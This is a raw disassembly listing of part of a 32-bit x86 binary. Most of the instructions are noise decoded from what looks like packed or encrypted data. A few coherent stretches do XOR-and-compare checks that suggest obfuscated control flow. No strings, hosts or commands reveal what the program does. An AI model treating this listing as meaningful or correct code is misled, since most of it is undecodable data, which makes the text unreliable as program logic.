  41b201:	or     cl,dl
  41b203:	fldl2e 
  41b205:	xchg   esi,eax
  41b206:	dec    ecx
  41b207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b208:	dec    esp
  41b209:	ss daa 
  41b20b:	cmp    eax,0xf4ea7f24
  41b210:	pop    eax
  41b211:	mov    bh,cl
  41b213:	pop    ds
  41b214:	mov    DWORD PTR [edx-0x9],esp
  41b217:	and    eax,ebp
  41b219:	pop    eax
  41b21a:	adc    DWORD PTR [ebp-0xe64e248],esp
  41b220:	inc    esp
  41b221:	push   0x1c
  41b223:	repz xchg esi,eax
  41b225:	int    0x2c
  41b227:	ss in  al,dx
  41b229:	loope  0x41b1ab
  41b22b:	shl    cl,cl
  41b22d:	test   al,0x2d
  41b22f:	sub    eax,0x7835cde3
  41b234:	mov    ebx,0x14aca06
  41b239:	sbb    al,ah
  41b23b:	mov    ds:0x44926234,eax
  41b240:	cs mov ch,0x7f
  41b243:	cli    
  41b244:	out    0xf0,eax
  41b246:	out    dx,eax
  41b247:	pusha  
  41b248:	fldcw  WORD PTR [edi+0x7f]
  41b24b:	lods   al,BYTE PTR ds:[esi]
  41b24c:	jns    0x41b293
  41b24e:	and    eax,0xe88c1c41
  41b253:	mov    cl,0xcc
  41b255:	sbb    eax,0x18e5c353
  41b25a:	rol    DWORD PTR [edi-0x1b4e784e],cl
  41b260:	int3   
  41b261:	sahf   
  41b262:	inc    ebp
  41b263:	rcr    DWORD PTR [eax-0x16],0xc6
  41b267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b268:	cmc    
  41b269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b26a:	std    
  41b26b:	repnz mov esp,0xc4a150ec
  41b271:	jmp    0xd0249107
  41b276:	jge    0x41b231
  41b278:	add    esp,edi
  41b27a:	rol    BYTE PTR [esp+ebp*1+0x3119a7ca],cl
  41b281:	ja     0x41b25e
  41b283:	(bad)
  41b286:	shl    DWORD PTR [ebp+0x52ab1374],1
  41b28c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b28d:	jnp    0x41b2ad
  41b28f:	sahf   
  41b290:	xchg   edi,eax
  41b291:	add    edx,DWORD PTR [esi-0x65b4bebc]
  41b297:	addr16 mov ?,edi
  41b29a:	scas   eax,DWORD PTR es:[edi]
  41b29b:	dec    esi
  41b29c:	jle    0x41b25d
  41b29e:	xor    al,0x68
  41b2a0:	add    esi,DWORD PTR [eax]
  41b2a2:	(bad)  
  41b2a3:	adc    al,0x8c
  41b2a5:	sbb    ecx,esp
  41b2a7:	and    DWORD PTR [esi],ebx
  41b2a9:	pop    cx
  41b2ab:	sahf   
  41b2ac:	jge    0x41b2b2
  41b2ae:	(bad)  
  41b2af:	jmp    0x351babd
  41b2b4:	jge    0x41b306
  41b2b6:	mov    ebx,0xace9a5f1
  41b2bb:	std    
  41b2bc:	outs   dx,BYTE PTR ds:[esi]
  41b2bd:	cdq    
  41b2be:	retf   0x3f0a
  41b2c1:	xor    DWORD PTR [ebx-0x26],esp
  41b2c4:	sub    BYTE PTR [ebx-0x13cbded3],ch
  41b2ca:	fcomp  QWORD PTR [ebp+0x3a]
  41b2cd:	scas   al,BYTE PTR es:[edi]
  41b2ce:	add    BYTE PTR [eax+0x4356abcb],cl
  41b2d4:	sbb    ch,bh
  41b2d6:	and    ch,BYTE PTR [eax]
  41b2d8:	push   esp
  41b2d9:	fadd   QWORD PTR [edi-0x3f]
  41b2dc:	shl    ebx,1
  41b2de:	and    esp,ebp
  41b2e0:	xchg   BYTE PTR [edx-0x17ef90b2],dl
  41b2e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2e7:	cmp    eax,0x3c8246b7
  41b2ec:	clc    
  41b2ed:	mov    bh,0x9a
  41b2ef:	test   BYTE PTR [ecx+ebp*2],dl
  41b2f2:	outs   dx,BYTE PTR ds:[esi]
  41b2f3:	mov    ecx,0x2aa20246
  41b2f8:	retf   
  41b2f9:	sahf   
  41b2fa:	push   ebx
  41b2fb:	inc    eax
  41b2fc:	loope  0x41b2ef
  41b2fe:	stos   BYTE PTR es:[edi],al
  41b2ff:	mov    BYTE PTR [ebx-0xf6cde9c],bh
  41b305:	fst    DWORD PTR [edi]
  41b307:	cmp    BYTE PTR [ecx],bl
  41b309:	sbb    al,0x5f
  41b30b:	fsubrp st(4),st
  41b30d:	mov    dh,0xab
  41b30f:	into   
  41b310:	dec    ebp
  41b311:	enter  0x5f35,0x76
  41b315:	push   ebx
  41b316:	aam    0xaf
  41b318:	and    dl,bh
  41b31a:	aam    0xe2
  41b31c:	add    al,0xd4
  41b31e:	xor    eax,0x43843bb8
  41b323:	aad    0x23
  41b325:	pop    ecx
  41b326:	jno    0x41b2b7
  41b328:	adc    al,0x53
  41b32a:	mov    ebp,0x7f2bd1d5
  41b32f:	test   al,0xd7
  41b331:	jnp    0x41b3a9
  41b333:	shr    ebx,cl
  41b335:	or     al,0x28
  41b337:	das    
  41b338:	leave  
  41b339:	dec    edx
  41b33a:	adc    BYTE PTR [edx+eiz*2-0x7f],0xf2
  41b33f:	ja     0x41b2e6
  41b341:	jns    0x41b30d
  41b343:	shrd   edx,eax,0x2
  41b347:	shr    eax,0x2
  41b34a:	mov    DWORD PTR [esp+0x34],eax
  41b34e:	mov    eax,DWORD PTR [esp+0x18]
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	sbb    edx,DWORD PTR [edi-0x33]
  41b36a:	jo     0x41b327
  41b36c:	(bad)  
  41b36d:	push   ss
  41b36e:	sbb    BYTE PTR [edx+edx*1-0x1c88e7e8],bh
  41b375:	fidiv  DWORD PTR [eax]
  41b377:	cmp    al,al
  41b379:	cmp    cl,BYTE PTR ds:0x9c1007b
  41b37f:	mov    dh,0x9d
  41b381:	inc    ebp
  41b382:	(bad)  
  41b383:	mov    al,0x6d
  41b385:	ja     0x41b3c9
  41b387:	(bad)  
  41b389:	jmp    FWORD PTR [esi+0x65]
  41b38c:	inc    esp
  41b38d:	jg     0x41b381
  41b38f:	sub    BYTE PTR [edx],0xab
  41b392:	xchg   ebp,eax
  41b393:	fs cmc 
  41b395:	mov    al,ds:0x94ca684d
  41b39a:	mov    DWORD PTR [ebp+0x3e],ebx
  41b39d:	xchg   edx,eax
  41b39e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b39f:	push   ds
  41b3a0:	(bad)  
  41b3a1:	neg    DWORD PTR [eax+0x31]
  41b3a4:	outs   dx,DWORD PTR ds:[esi]
  41b3a5:	lods   eax,DWORD PTR ds:[esi]
  41b3a6:	mov    dl,0x83
  41b3a8:	inc    esp
  41b3a9:	mov    edi,0xc44ce9da
  41b3ae:	out    dx,al
  41b3af:	ret    
  41b3b0:	pop    ecx
  41b3b1:	xchg   edx,eax
  41b3b2:	fistp  WORD PTR [esi]
  41b3b4:	jnp    0x41b345
  41b3b6:	loopne 0x41b41f
  41b3b8:	mov    ebp,0x975ff5d1
  41b3bd:	adc    BYTE PTR [edx],dh
  41b3bf:	adc    cl,ch
  41b3c1:	jg     0x41b41c
  41b3c3:	ja     0x41b391
  41b3c5:	fcomi  st,st(2)
  41b3c7:	jle    0x41b37b
  41b3c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3ca:	imul   BYTE PTR [edx]
  41b3cc:	test   al,0xe0
  41b3ce:	addr16 into 
  41b3d0:	imul   eax,DWORD PTR [eax],0x7b
  41b3d3:	int    0xc6
  41b3d5:	xchg   DWORD PTR [ecx+0x5b5dfbae],ebp
  41b3db:	outs   dx,DWORD PTR ds:[esi]
  41b3dc:	leave  
  41b3dd:	mov    esi,0xa6c86274
  41b3e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3e3:	jp     0x41b430
  41b3e5:	out    0x6c,eax
  41b3e7:	mov    ah,0x21
  41b3e9:	js     0x41b38e
  41b3eb:	fsub   st,st(6)
  41b3ed:	or     eax,0xc3c090e7
  41b3f2:	std    
  41b3f3:	xchg   ecx,eax
  41b3f4:	jecxz  0x41b38f
  41b3f6:	sbb    cl,BYTE PTR [edi-0x1f0edee6]
  41b3fc:	dec    ecx
  41b3fd:	push   cs
  41b3fe:	mov    esi,esp
  41b400:	cmp    eax,0x19774367
  41b405:	sub    eax,0x3a72c1a2
  41b40a:	in     eax,0xec
  41b40c:	xchg   BYTE PTR [ebx+0x14],bh
  41b40f:	lahf   
  41b410:	into   
  41b411:	cmc    
  41b412:	cdq    
  41b413:	add    eax,0x241241a1
  41b418:	hlt    
  41b419:	in     al,0x3c
  41b41b:	in     al,0x21
  41b41d:	xchg   edi,eax
  41b41e:	fs sti 
  41b420:	mov    ch,BYTE PTR [esi]
  41b422:	adc    edi,DWORD PTR [ecx+0x6]
  41b425:	cmp    BYTE PTR [ecx],0xc6
  41b428:	sbb    al,0x2b
  41b42a:	xor    BYTE PTR [ebp-0x4e],dh
  41b42d:	inc    ebx
  41b42e:	fcomip st,st(0)
  41b430:	cmp    eax,DWORD PTR [edx]
  41b432:	(bad)  
  41b433:	sub    BYTE PTR ds:0xe1bcd272,al
  41b439:	mov    ah,0xe1
  41b43b:	xor    al,0xb2
  41b43d:	test   eax,0x71eac3c9
  41b442:	and    ah,bh
  41b444:	in     al,dx
  41b445:	jge    0x41b458
  41b447:	jbe    0x41b3ff
  41b449:	fld    DWORD PTR [edi-0x424f60ea]
  41b44f:	pop    ecx
  41b450:	(bad)  
  41b451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b452:	or     DWORD PTR [edi-0x43],esi
  41b455:	add    al,0x77
  41b457:	adc    dh,BYTE PTR ds:0x68a63404
  41b45d:	loopne 0x41b490
  41b45f:	jo     0x41b426
  41b461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b462:	mov    dh,0x7a
  41b464:	mov    eax,ds:0x9afdc0ab
  41b469:	cs in  al,dx
  41b46b:	ins    DWORD PTR es:[edi],dx
  41b46c:	xor    edi,edi
  41b46e:	pop    ecx
  41b46f:	pop    eax
  41b470:	or     eax,0xc59fc950
  41b475:	jp     0x41b44d
  41b477:	inc    esp
  41b478:	ds leave 
  41b47a:	add    dl,BYTE PTR [ebx-0x6f]
  41b47d:	nop
  41b47e:	jae    0x41b4b2
  41b480:	adc    DWORD PTR [ebx+eiz*4-0x21],eax
  41b484:	pushf  
  41b485:	and    BYTE PTR [esi-0x286629c5],ah
  41b48b:	mov    bh,0x3b
  41b48d:	dec    esp
  41b48e:	dec    esp
  41b48f:	and    BYTE PTR [edi-0x39beb68b],ch
  41b495:	add    DWORD PTR [ebx],ebx
  41b497:	adc    eax,0x317e273a
  41b49c:	ins    BYTE PTR es:[edi],dx
  41b49d:	lods   al,BYTE PTR ds:[esi]
  41b49e:	jmp    0xa83:0x85b5706c
  41b4a5:	pop    ebp
  41b4a6:	add    eax,0x2daa2b81
  41b4ab:	inc    esi
  41b4ac:	leave  
  41b4ad:	pop    es
  41b4ae:	dec    ebp
  41b4af:	stc    
  41b4b0:	inc    ecx
  41b4b1:	jne    0x41b4b2
  41b4b3:	call   0x8e63fdc9
  41b4b8:	dec    edx
  41b4b9:	xchg   ebp,eax
  41b4ba:	jge    0x41b459
  41b4bc:	mov    dl,0xc8
  41b4be:	cmp    eax,0x44fccc16
  41b4c3:	lds    ecx,FWORD PTR [edi]
  41b4c5:	jb     0x41b4fd
  41b4c7:	rcl    DWORD PTR [esi+0x7a],cl
  41b4ca:	jns    0x41b503
  41b4cc:	les    eax,FWORD PTR [edi+0x5256a24e]
  41b4d2:	or     DWORD PTR [ebx-0x29],eax
  41b4d5:	ret    0x65d2
  41b4d8:	fwait
  41b4d9:	cdq    
  41b4da:	add    eax,0xe8fc2f69
  41b4df:	loop   0x41b49e
  41b4e1:	push   eax
  41b4e2:	jmp    0x41b469
  41b4e4:	test   al,0xb
  41b4e6:	xchg   ebp,eax
  41b4e7:	ffree  st(5)
  41b4e9:	shl    DWORD PTR [ecx+ebx*4],1
  41b4ec:	not    DWORD PTR [edx+0x33bd5fb1]
  41b4f2:	push   0x3ef52fa0
  41b4f7:	xchg   edx,eax
  41b4f8:	dec    edi
  41b4f9:	push   edi
  41b4fa:	enter  0x2f00,0xac
  41b4fe:	jnp    0x41b4ff
  41b500:	repz test eax,0xfd4610ac
  41b506:	aaa    
  41b507:	fcom   DWORD PTR [ebx]
  41b509:	cmc    
  41b50a:	fild   QWORD PTR [edx]
  41b50c:	dec    eax
  41b50d:	add    ebp,DWORD PTR [ebp-0x6628a75]
  41b513:	xor    DWORD PTR [eax+0x70],0x5c
  41b517:	mov    al,0xb1
  41b519:	int    0xce
  41b51b:	and    DWORD PTR [ebx-0x1eacad0c],ebp
  41b521:	or     bh,0xaa
  41b524:	push   es
  41b525:	mov    ds:0xfbb4b9c0,eax
  41b52a:	adc    al,0x59
  41b52c:	lods   eax,DWORD PTR ds:[esi]
  41b52d:	gs xchg ah,ch
  41b530:	test   ah,ch
  41b532:	stos   DWORD PTR es:[edi],eax
  41b533:	rol    BYTE PTR [esi+0x1b],1
  41b536:	add    dl,BYTE PTR [eax+0x56ffb574]
  41b53c:	and    DWORD PTR [ebx+esi*4-0x3f12293a],edi
  41b543:	add    al,BYTE PTR [ecx]
  41b545:	pop    esi
  41b546:	mov    esp,0x1d269a2a
  41b54b:	pop    ecx
  41b54c:	out    dx,al
  41b54d:	adc    ah,0x1b
  41b550:	sbb    al,0x7d
  41b552:	sahf   
  41b553:	je     0x41b532
  41b555:	adc    BYTE PTR [eax+eax*2-0x3c],dh
  41b559:	sub    BYTE PTR [ebx+0x44],cl
  41b55c:	mov    ds:0x7160f194,al
  41b561:	jecxz  0x41b5bf
  41b563:	lods   al,BYTE PTR ds:[esi]
  41b564:	mov    ebp,0x1215e79d
  41b569:	mov    bl,0x42
  41b56b:	int3   
  41b56c:	sar    DWORD PTR [ecx],0x51
  41b56f:	mov    bl,0x88
  41b571:	daa    
  41b572:	or     al,0x2a
  41b574:	push   edx
  41b575:	xchg   ecx,eax
  41b576:	lahf   
  41b577:	adc    esi,ebp
  41b579:	pop    ebx
  41b57a:	ret    0x2b5
  41b57d:	xchg   edx,eax
  41b57e:	sbb    eax,0xcba197c4
  41b583:	std    
  41b584:	dec    edx
  41b585:	jecxz  0x41b602
  41b587:	mov    dl,0xae
  41b589:	add    al,0xec
  41b58b:	mov    gs,WORD PTR [ebx+0x3]
  41b58e:	pusha  
  41b58f:	ror    DWORD PTR ds:0x7cc98e64,0x41
  41b596:	dec    esp
  41b597:	mov    BYTE PTR [ebx],0x20
  41b59a:	lds    edi,FWORD PTR [esi+0xa]
  41b59d:	push   cs
  41b59e:	or     DWORD PTR [edx-0x7c],edx
  41b5a1:	popa   
  41b5a2:	xlat   BYTE PTR ds:[ebx]
  41b5a3:	loopne 0x41b5b3
  41b5a5:	(bad)  
  41b5a6:	cdq    
  41b5a7:	mov    bl,0x29
  41b5a9:	psrld  mm3,mm1
  41b5ac:	add    DWORD PTR [eax],eax
  41b5ae:	inc    eax
  41b5af:	sbb    edx,esi
  41b5b1:	das    
  41b5b2:	fild   DWORD PTR [eax+0x50]
  41b5b5:	push   ecx
  41b5b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5b7:	adc    BYTE PTR [eax+eax*4],0xa0
  41b5bb:	sub    BYTE PTR [ecx],ah
  41b5bd:	data16 das 
  41b5bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5c0:	xor    BYTE PTR [edx+0xe3de43d],dl
  41b5c6:	or     bl,bh
  41b5c8:	sar    al,cl
  41b5ca:	mov    ds:0x783c42da,eax
  41b5cf:	adc    eax,0xf3949ae1
  41b5d4:	das    
  41b5d5:	sar    ecx,1
  41b5d7:	xchg   ecx,eax
  41b5d8:	mov    edx,0x8cca8464
  41b5dd:	or     al,0x69
  41b5df:	jmp    0xcfc5bb74
  41b5e4:	loopne 0x41b5eb
  41b5e6:	nop
  41b5e7:	mov    bh,0x90
  41b5e9:	pop    esp
  41b5ea:	sti    
  41b5eb:	dec    ecx
  41b5ec:	push   edx
  41b5ed:	outs   dx,BYTE PTR ds:[esi]
  41b5ee:	push   0xffffffd6
  41b5f0:	or     al,0xaf
  41b5f2:	or     DWORD PTR [edi-0x13],edi
  41b5f5:	xchg   esi,eax
  41b5f6:	dec    ebx
  41b5f7:	mov    ss,WORD PTR [eax+0x41]
  41b5fa:	push   edi
  41b5fb:	aaa    
  41b5fc:	xchg   ebx,eax
  41b5fd:	lea    edx,ds:0x7d6b11f0
  41b603:	dec    eax
  41b604:	xor    ecx,DWORD PTR [ecx]
  41b606:	jmp    FWORD PTR [edi-0x4e]
  41b609:	fs xchg esi,eax
  41b60b:	int    0xdb
  41b60d:	enter  0x858c,0xd
  41b611:	test   DWORD PTR [edi],edx
  41b613:	jno    0x41b68d
  41b615:	pop    ds
  41b616:	adc    al,0x36
  41b618:	std    
  41b619:	add    eax,0xfd4cc903
  41b61e:	fwait
  41b61f:	add    BYTE PTR [edx+0x495c79a2],ch
  41b625:	lds    esp,FWORD PTR [ebx+0x6c]
  41b628:	fidivr DWORD PTR [eax-0x4f]
  41b62b:	data16 out dx,al
  41b62d:	sbb    eax,0x4c4db07e
  41b632:	jbe    0x41b64a
  41b634:	xchg   edx,eax
  41b635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b636:	sub    cl,dh
  41b638:	add    ch,cl
  41b63a:	dec    esp
  41b63b:	retf   0x48e9
  41b63e:	cdq    
  41b63f:	in     al,dx
  41b640:	mov    dl,0x11
  41b642:	push   ebp
  41b643:	je     0x41b5d2
  41b645:	stc    
  41b646:	jae    0x41b5dc
  41b648:	das    
  41b649:	mov    dh,0x81
  41b64b:	scas   al,BYTE PTR es:[edi]
  41b64c:	sbb    DWORD PTR [esp+ebx*4+0x40],ebp
  41b650:	fbstp  TBYTE PTR ds:0xd9aa8a1e
  41b656:	popa   
  41b657:	jne    0x41b636
  41b659:	cmp    ebp,DWORD PTR [ebx+0x71]
  41b65c:	cmp    DWORD PTR [esi-0x4e],ecx
  41b65f:	into   
  41b660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b661:	cwde   
  41b662:	xchg   ebx,eax
  41b663:	fstp   TBYTE PTR [edx+0x61]
  41b666:	push   cs
  41b667:	inc    ebx
  41b668:	ret    0x5c2c
  41b66b:	jae    0x41b6c4
  41b66d:	js     0x41b5f2
  41b66f:	or     DWORD PTR [ebp*2+0x53ede4ca],ebx
  41b676:	xchg   BYTE PTR [ecx],dh
  41b678:	stos   BYTE PTR es:[edi],al
  41b679:	(bad)
  41b67c:	mov    ah,dl
  41b67e:	add    al,0xed
  41b680:	leave  
  41b681:	outs   dx,DWORD PTR ds:[esi]
  41b682:	push   esp
  41b683:	mov    ds:0xc0582ea1,eax
  41b688:	cmp    ecx,ecx
  41b68a:	sti    
  41b68b:	pop    edx
  41b68c:	mov    eax,ds:0x4fa8d646
  41b691:	dec    eax
  41b692:	fsub   st(6),st
  41b694:	jmp    0x6ac2ca16
  41b699:	push   DWORD PTR [ebx-0x19]
  41b69c:	push   0x749a4add
  41b6a1:	jle    0x41b6d5
  41b6a3:	mov    edi,0xc0828636
  41b6a8:	pushf  
  41b6a9:	and    al,0xa7
  41b6ab:	mov    esi,0x7f6af275
  41b6b0:	cwde   
  41b6b1:	mov    cl,0x46
  41b6b3:	adc    DWORD PTR [ebp+0x43],ebp
  41b6b6:	xchg   si,ax
  41b6b8:	pusha  
  41b6b9:	mov    ?,esi
  41b6bb:	adc    eax,0xa2db58fa
  41b6c0:	adc    esi,ebx
  41b6c2:	dec    edi
  41b6c3:	fmul   DWORD PTR [eax+ecx*2+0x372fc5d7]
  41b6ca:	test   BYTE PTR [edi+0x51a050f2],0x4a
  41b6d1:	pop    es
  41b6d2:	jge    0x41b6a2
  41b6d4:	or     al,0x19
  41b6d6:	lock mov ch,0xae
  41b6d9:	dec    edx
  41b6da:	(bad)  
  41b6db:	dec    edx
  41b6dc:	adc    eax,ebp
  41b6de:	or     BYTE PTR [edx-0x21],0xfc
  41b6e2:	enter  0x943c,0x62
  41b6e6:	jb     0x41b74b
  41b6e8:	sbb    cl,BYTE PTR [ecx-0x7d9e721f]
  41b6ee:	jno    0x41b765
  41b6f0:	mov    gs,WORD PTR [eax]
  41b6f2:	inc    eax
  41b6f3:	inc    edi
  41b6f4:	mov    cl,0x23
  41b6f6:	scas   al,BYTE PTR es:[edi]
  41b6f7:	out    0xa7,eax
  41b6f9:	pop    ebx
  41b6fa:	add    eax,0xeee756e6
  41b6ff:	jmp    0xae92fec1
  41b704:	out    0x11,al
  41b706:	arpl   WORD PTR [esi],bx
  41b708:	push   eax
  41b709:	into   
  41b70a:	lods   eax,DWORD PTR ds:[esi]
  41b70b:	xchg   DWORD PTR [ebx+0x2d],esi
  41b70e:	lods   eax,DWORD PTR ds:[esi]
  41b70f:	rcl    DWORD PTR [ecx],0x8a
  41b712:	sti    
  41b713:	(bad)  
  41b714:	ins    BYTE PTR es:[edi],dx
  41b715:	and    DWORD PTR [bx+di],ecx
  41b718:	jnp    0x41b724
  41b71a:	jg     0x41b72f
  41b71c:	or     bl,BYTE PTR ds:0xa9491bae
  41b722:	push   ecx
  41b723:	iret   
  41b724:	jl     0x41b6e7
  41b726:	loopne 0x41b746
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x422654
  41b758:	mov    DWORD PTR [esp+0x68],0x42264c
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x4225dc
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx+0x50aa298c],dh
  41b815:	sbb    eax,0x895eb06b
  41b81a:	push   ss
  41b81b:	sbb    BYTE PTR [edx+edx*1+0x4fa11818],bh
  41b822:	arpl   WORD PTR [edi],bp
  41b824:	jmp    FWORD PTR [ecx]
  41b826:	dec    ecx
  41b827:	mov    ebx,0xc842f4eb
  41b82c:	pop    esp
  41b82d:	icebp  
  41b82e:	or     ebp,DWORD PTR [edi]
  41b830:	push   ss
  41b831:	lds    ecx,FWORD PTR [esi]
  41b833:	enter  0x8a93,0xb1
  41b837:	jp     0x41b848
  41b839:	outs   dx,DWORD PTR ds:[esi]
  41b83a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b83b:	ins    DWORD PTR es:[edi],dx
  41b83c:	and    BYTE PTR fs:[ebp+0x7ea1745a],dh
  41b843:	and    al,0xbf
  41b845:	inc    ebp
  41b846:	xchg   BYTE PTR [esi-0x64],dl
  41b849:	mov    edx,0x3c1e2387
  41b84e:	xchg   DWORD PTR [esi],edx
  41b850:	sbb    eax,0x9a55e70e
  41b855:	push   edx
  41b856:	sub    DWORD PTR [ecx-0x1e3df168],ecx
  41b85c:	cmp    ecx,ebx
  41b85e:	or     BYTE PTR [ebp+0x54],ah
  41b861:	push   cs
  41b862:	in     eax,0x7a
  41b864:	idiv   BYTE PTR ds:0x9420e612
  41b86a:	push   ebx
  41b86b:	adc    al,dl
  41b86d:	popa   
  41b86e:	int3   
  41b86f:	fwait
  41b870:	retf   0x90a3
  41b873:	test   ch,al
  41b875:	push   eax
  41b876:	test   al,0x8e
  41b878:	fs test eax,0x9da2825a
  41b87e:	adc    al,0xc1
  41b881:	mov    ds:0x3b925739,eax
  41b886:	jno    0x41b829
  41b888:	loope  0x41b8d2
  41b88a:	sahf   
  41b88b:	fistp  QWORD PTR [eax+0x3d90cecc]
  41b891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b892:	test   DWORD PTR [eax+ebx*1],esp
  41b895:	push   esi
  41b896:	or     DWORD PTR [eax],0xfffffff3
  41b899:	sbb    DWORD PTR [ecx+0x1d],ebp
  41b89c:	dec    ebp
  41b89d:	test   bh,ah
  41b89f:	pushf  
  41b8a0:	mov    ch,0xa6
  41b8a2:	out    dx,al
  41b8a3:	and    ecx,edi
  41b8a5:	iret   
  41b8a6:	add    cl,BYTE PTR [esp+ebx*4]
  41b8a9:	js     0x41b890
  41b8ab:	xchg   edi,eax
  41b8ac:	mov    eax,ds:0xff86221b
  41b8b1:	xor    DWORD PTR [esi+0x1db535f5],edx
  41b8b7:	and    BYTE PTR [edi+0xaaaa53f],al
  41b8bd:	nop
  41b8be:	jecxz  0x41b8cd
  41b8c0:	dec    eax
  41b8c1:	sub    al,0x17
  41b8c3:	mov    al,0x75
  41b8c5:	xchg   edi,eax
  41b8c6:	push   ss
  41b8c7:	add    DWORD PTR [edx],esp
  41b8c9:	add    eax,0xec0f23b2
  41b8ce:	cdq    
  41b8cf:	gs call 0xd087:0xaca39c48
  41b8d7:	push   cs
  41b8d8:	pop    ecx
  41b8d9:	rcr    bl,1
  41b8db:	inc    edi
  41b8dc:	xor    DWORD PTR [ebp-0x22],eax
  41b8df:	jno    0x41b8a1
  41b8e1:	mov    WORD PTR [edi],cs
  41b8e3:	and    eax,0x50536c5d
  41b8e8:	adc    edx,DWORD PTR [ebx+0x52]
  41b8eb:	jmp    0xaa5a0b98
  41b8f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8f1:	adc    BYTE PTR [ebx],al
  41b8f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8f4:	jmp    0x41b967
  41b8f6:	adc    edi,DWORD PTR [ecx+0x3b27ee36]
  41b8fc:	mov    edx,0x5402298c
  41b901:	dec    esp
  41b902:	aaa    
  41b903:	rcl    DWORD PTR [esp+eiz*2+0x52a48968],cl
  41b90a:	js     0x41b8ff
  41b90c:	mov    gs,WORD PTR [edx-0x4bc29244]
  41b912:	mov    ch,0x56
  41b914:	arpl   WORD PTR [edi+0x1e6961c8],ax
  41b91a:	xchg   esp,eax
  41b91b:	call   0x632ba80a
  41b920:	std    
  41b921:	adc    dl,BYTE PTR ds:0x1d29762b
  41b927:	sbb    eax,0x65902854
  41b92c:	arpl   ax,bx
  41b92e:	xchg   DWORD PTR [ebx],esi
  41b930:	adc    edi,DWORD PTR [ebx-0x4cbf45]
  41b936:	hlt    
  41b937:	sbb    eax,0x33d9eacc
  41b93c:	pop    eax
  41b93d:	in     eax,0x27
  41b93f:	stos   DWORD PTR es:[edi],eax
  41b940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b941:	or     al,0xd7
  41b943:	aam    0xa4
  41b945:	sbb    al,0xe6
  41b947:	xor    BYTE PTR [eax+esi*2+0x6b],dl
  41b94b:	dec    ebx
  41b94c:	sbb    al,0x6
  41b94e:	pop    ds
  41b94f:	scas   ax,WORD PTR es:[edi]
  41b951:	retf   
  41b952:	bound  ecx,QWORD PTR ds:0x325a4f4b
  41b958:	in     al,dx
  41b959:	mov    edx,0xbd3a0d2a
  41b95e:	bound  esi,QWORD PTR [esi-0x74c2f908]
  41b964:	push   edi
  41b965:	xrelease xchg DWORD PTR [esi-0x76],edx
  41b969:	jecxz  0x41b9e5
  41b96b:	xor    DWORD PTR [ebx-0x2a],edx
  41b96e:	aam    0x48
  41b970:	aam    0xd5
  41b972:	mov    ah,0x3f
  41b974:	std    
